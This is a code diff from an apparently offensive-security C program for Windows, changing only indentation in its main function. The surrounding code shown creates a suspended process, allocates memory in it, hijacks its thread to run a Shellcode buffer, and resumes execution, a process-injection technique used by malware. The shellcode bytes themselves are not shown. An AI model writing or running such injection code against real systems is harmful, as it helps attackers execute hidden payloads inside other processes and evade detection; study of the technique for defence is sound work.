@@ -52,7 +52,7 @@ int main(int argc, char* argv[]) {
     DWORD  PID           = 0;
     BOOL   State         = TRUE;
     PVOID  Buffer        = NULL;
-	HANDLE ThreadHandle  = NULL;
+    HANDLE ThreadHandle  = NULL;
     HANDLE ProcessHandle = NULL;
 
     CreateSuspendedProcess(argv[1], &PID, &ProcessHandle, &ThreadHandle);
@@ -64,13 +64,13 @@ int main(int argc, char* argv[]) {
     }
     OKAY("[0x%p] [RW-] allocated a buffer in memory with PAGE_READWRITE [RW-] permissions!", Buffer);
 
-	if (!RemoteThreadHijack(ThreadHandle, ProcessHandle, Buffer, Shellcode, sizeof(Shellcode))) {
-		WARN("thread hijack failed, exiting...");
+    if (!RemoteThreadHijack(ThreadHandle, ProcessHandle, Buffer, Shellcode, sizeof(Shellcode))) {
+        WARN("thread hijack failed, exiting...");
         State = FALSE; goto CLEANUP;
-	}
-	OKAY("[0x%p] hijack was successful! resuming thread...", ThreadHandle);
+    }
+    OKAY("[0x%p] hijack was successful! resuming thread...", ThreadHandle);
 
-	ResumeThread(ThreadHandle);
+    ResumeThread(ThreadHandle);
     INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
     WaitForSingleObject(ThreadHandle, INFINITE);
     INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);
